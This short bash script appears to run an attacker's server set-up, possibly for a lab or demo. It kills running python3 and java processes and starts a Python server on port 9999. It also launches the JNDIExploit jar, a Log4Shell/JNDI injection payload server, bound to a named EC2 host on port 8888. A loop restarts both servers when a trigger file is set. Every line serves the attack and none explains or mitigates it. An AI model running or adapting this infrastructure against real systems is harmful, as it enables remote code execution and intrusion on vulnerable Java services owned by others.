#!/bin/bash

runServers () { 
    echo "" > output.log
    echo "" > nohup.out
    pkill python3 || true
    pkill java || true
    python3 ./server.py 9999 &
    java -Djava.io.tmpdir=/home/ubuntu/attacker/javaTmp -jar JNDIExploit-1.2-SNAPSHOT.jar -i ec2-34-252-239-226.eu-west-1.compute.amazonaws.com -p 8888 &
}
runServers
while :
do
    if [ "1" == "$(cat /home/ubuntu/attacker/attackWeb/restart-server.txt)" ];
    then
      echo "restart";
      echo "0" > "/home/ubuntu/attacker/attackWeb/restart-server.txt"
      runServers;
    fi
    sleep 5
done